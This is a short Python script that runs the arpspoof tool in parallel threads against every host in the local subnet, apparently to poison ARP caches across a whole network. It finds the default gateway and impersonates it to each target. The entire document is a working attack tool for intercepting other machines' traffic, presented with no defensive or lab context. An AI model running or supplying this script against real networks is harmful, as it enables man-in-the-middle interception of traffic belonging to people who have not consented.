import subprocess
import threading
import socket
import os
import re
import netifaces
import time

def run_arpspoof(ip, gateway):
    part = ".".join(gateway.split(".")[:3]) + "."
    ip_total = part + str(ip)
    command = f"sudo arpspoof -i {interface} -t {ip_total} {gateway}"

    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(f"Standard output for {ip}:")
    print(stdout.decode())
    print(f"Standard error for {ip}:")
    print(stderr.decode())

def is_valid_ip(ip):
    return re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', ip)

def is_valid_gateway(gateway):
    return is_valid_ip(gateway)

os.system("clear")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|                 Spoffing a subnetwork             |")
print ("\---------------------------------------------------/")
print (" ")
print (" ---------------------[Settings]-------------------- ")
print (" ")
t1 = time.time()
interface = input("Interface (e.g., eth0): ")
start_range = input("Start range (0) : ")
end_range = input("End range (255) : ")

start_range = 0 if start_range == "" else int(start_range)
end_range = 255 if end_range == "" else int(end_range)


try:
    ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
except Exception as e:
    print("Failed to retrieve IP address for the specified interface.")
    exit()


gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]


if not is_valid_gateway(gateway) or not is_valid_ip(ip):
    print("Invalid IP or gateway. Please provide valid inputs.")
else:
    threads = []
    for i in range(start_range, end_range):
        if i != int(ip.split(".")[-1]):
            thread = threading.Thread(target=run_arpspoof, args=(i, gateway))
            threads.append(thread)
            thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

print(f"ARP spoofing completed for the specified range in {round(time.time() - t1, 2)} seconds.")